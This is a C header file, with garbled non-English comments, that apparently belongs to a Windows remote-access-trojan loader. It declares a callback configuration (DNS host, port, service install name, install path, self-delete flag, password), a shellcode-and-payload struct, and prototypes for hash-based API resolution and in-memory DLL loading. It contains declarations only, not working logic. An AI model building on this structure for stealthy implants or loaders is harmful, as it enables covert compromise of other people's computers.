#pragma once
#include<Windows.h>
#include <Winternl.h>
#ifdef _WIN64
typedef  DWORD64 DWORDX;
#else
typedef  DWORD32 DWORDX;
#endif

typedef struct  // ����Dat�ļ��ṹ
{
	char DNS[256];  //����
	int  Port;		//�˿�
	char UpGroup[32];//���߷���
	char Packet[32];//��ע
	char szCurrentDateTime[32];//��װʱ��
	char ServiceName[50];   //��������
	char ServicePlay[50];   //������ʾ
	char ServiceDesc[150];   //��������
	char ReleasePath[100];   //��װ·��
	char ReleaseName[50];    //��װ����
	char szthisfile[MAX_PATH];    //��ǰ�����ļ�
	int  Dele_zc;            //��������
	char szOnlinePass[20];
}MODIFY_DATA;

typedef struct
{
	TCHAR Shellcode[10 * 1024];
	int  dwShellcodelen;
	TCHAR File[300 * 1024];
	int  dwFilelen;
	MODIFY_DATA modify_data;
	int RunSessionid;
}ShellcodeStr;


typedef NTSTATUS(WINAPI* LdrGetProcedureAddressT)(IN PVOID DllHandle, IN PANSI_STRING ProcedureName OPTIONAL, IN ULONG ProcedureNumber OPTIONAL, OUT FARPROC* ProcedureAddress);
typedef VOID(WINAPI* RtlFreeUnicodeStringT)(_Inout_ PUNICODE_STRING UnicodeString);
typedef  VOID(WINAPI* RtlInitAnsiStringT)(_Out_    PANSI_STRING DestinationString, _In_opt_ PCSZ         SourceString);
typedef NTSTATUS(WINAPI* RtlAnsiStringToUnicodeStringT)(_Inout_ PUNICODE_STRING DestinationString, _In_ PCANSI_STRING SourceString, _In_ BOOLEAN AllocateDestinationString);
typedef NTSTATUS(WINAPI* LdrLoadDllT)(PWCHAR, PULONG, PUNICODE_STRING, PHANDLE);
typedef BOOL(APIENTRY* ProcDllMain)(LPVOID, DWORD, LPVOID);
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemoryT)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect);
typedef BOOL (* Run)(ShellcodeStr* aa);
typedef struct
{
	LdrGetProcedureAddressT pLdrGetProcedureAddress;
	RtlFreeUnicodeStringT pRtlFreeUnicodeString;
	RtlInitAnsiStringT pRtlInitAnsiString;
	RtlAnsiStringToUnicodeStringT pRtlAnsiStringToUnicodeString;
	LdrLoadDllT pLdrLoadDll;
	NtAllocateVirtualMemoryT pNtAllocateVirtualMemoryT;
}FUNCTION;


BOOL MyStrcmp(DWORD str1, char* str2);
DWORD GetProcHash(char* lpProcName);
HMODULE GetNtdll();
DWORD MyGetProcAddress(HMODULE hModule, DWORD lpProcName);
DWORD WINAPI MemLoadLibrary(ShellcodeStr* shellcoder,PDWORD run);